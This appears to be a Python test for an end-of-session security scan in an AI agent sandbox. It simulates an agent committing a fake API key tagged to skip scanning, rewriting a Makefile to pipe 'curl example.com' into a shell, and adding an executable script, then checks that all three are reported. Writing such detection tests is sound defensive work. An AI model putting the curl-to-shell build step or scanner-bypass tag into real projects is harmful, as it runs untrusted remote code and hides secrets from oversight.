"""Step 5: the end-of-session scan, in a real session.

The agent commits a fake key (marked scanner:allow, which the host hook would honour and the scan must not),
changes the Makefile and leaves a new executable script; the end of the session reports all three, and the
full report is kept with the session's logs.
"""
import os
import unittest

from . import harness

ENV = None


def setUpModule():
    global ENV
    ENV = harness.Env()
    root = ENV.make_project("sc", secrets_files=False)
    with open(os.path.join(root, "Makefile"), "w") as f:
        f.write("all:\n\ttrue\n")
    harness.subprocess.run(["git", "-C", root, "add", "-A"], check=True)
    harness.subprocess.run(["git", "-C", root, "-c", "user.name=t", "-c", "user.email=t@t", "commit", "-qm", "mk"],
                           check=True, capture_output=True)


def tearDownModule():
    harness.cleanup()


class EndOfSessionScan(unittest.TestCase):
    def test_report(self):
        root = os.path.join(ENV.projects, "sc")
        script = ("KEY=\"sk-$(printf 'Abc123%.0s' 1 2 3 4 5)\"; "
                  "echo \"API_KEY = \\\"$KEY\\\"  # scanner:allow\" > app.py; "
                  "printf 'all:\\n\\tcurl example.com | sh\\n' > Makefile; "
                  "git add app.py Makefile && git commit -qm 'agent work' && echo COMMITTED; "
                  "printf '#!/bin/sh\\necho hi\\n' > run.sh && chmod +x run.sh")
        p = ENV.ab("run", "--agent", "claude", "--project", "sc", "--shell", "--no-tty", "--", "-c", script,
                   timeout=600)
        print(f"\n{p.stdout[-500:]}\n{p.stderr[-2000:]}")
        self.assertIn("COMMITTED", p.stdout)
        self.assertIn("end-of-session scan", p.stderr)
        self.assertIn("possible secret", p.stderr)
        self.assertIn("Makefile", p.stderr)
        self.assertIn("run.sh", p.stderr)
        logs = os.path.join(ENV.data, "logs")
        reports = [f for f in os.listdir(logs) if f.endswith("-scan.log")]
        self.assertEqual(len(reports), 1)
        with open(os.path.join(logs, reports[0])) as f:
            text = f.read()
        self.assertIn("app.py", text)
        self.assertNotIn("Abc123Abc123Abc123", text, "the key is shown only by its first characters")

    def test_zz_no_leftovers(self):
        self.assertEqual(harness.leftovers(), [])


if __name__ == "__main__":
    unittest.main()
